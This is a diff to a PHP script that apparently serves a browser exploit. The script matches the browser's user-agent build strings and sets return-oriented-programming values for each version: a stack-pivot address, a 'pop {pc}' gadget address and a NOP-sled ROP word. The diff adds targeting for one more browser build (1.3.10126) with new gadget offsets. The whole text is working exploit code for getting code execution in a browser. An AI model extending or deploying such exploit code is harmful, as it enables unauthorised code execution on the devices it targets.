@@ -62,9 +62,13 @@ if(strstr($ua, "1.0.9934"))//1.0.9934 v10 9.0.0-20
 {
 	$browserver = 0x80;
 }
-else if(strstr($ua, "1.1.9996"))// 1.1.9996 v1027 9.3.0-21
+else if(strstr($ua, "1.1.9996"))//1.1.9996 v1027 9.3.0-21
 {
 	$browserver = 0x81;
+}
+else if(strstr($ua, "1.3.10126"))//1.3.10126 v3077 9.9.0-26 (this version isn't fully supported)
+{
+	$browserver = 0x83;
 }
 
 if($browserver == -1)
@@ -74,7 +78,7 @@ if($browserver == -1)
 	return;
 }
 
-if($browserver != 1 && $browserver != 2 && $browserver != 3 && $browserver != 4  && $browserver != 5 && $browserver != 0x80 && $browserver != 0x81)
+if($browserver != 1 && $browserver != 2 && $browserver != 3 && $browserver != 4  && $browserver != 5 && $browserver != 0x80 && $browserver != 0x81 && $browserver != 0x83)
 {
 	echo "This browser version is not supported.\n";
 	writeNormalLog("RESULT: 200 BROWSERVER NOT SUPPORTED");
@@ -629,6 +633,10 @@ else if($browserver == 0x81)
 	//$APT_PrepareToDoApplicationJump = 0x00299fb8;//needs updated
 	//$APT_DoApplicationJump = 0x0029953c;//needs updated
 }
+else if($browserver == 0x83)
+{
+	$STACKPIVOT_ADR = 0x0027b058;
+}
 
 if($browserver == 3 || $browserver == 4)$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x2f9f0;
 
@@ -739,6 +747,7 @@ else
 	if($browserver == 5)$POPPC = 0x00105818;
 	if($browserver == 0x80)$POPPC = 0x001de80c;
 	if($browserver == 0x81)$POPPC = 0x001def10;
+	if($browserver == 0x83)$POPPC = 0x001df5a4;
 }
 
 $NOPSLEDROP = genu32_unicode_jswrap($POPPC);//"pop {pc}"
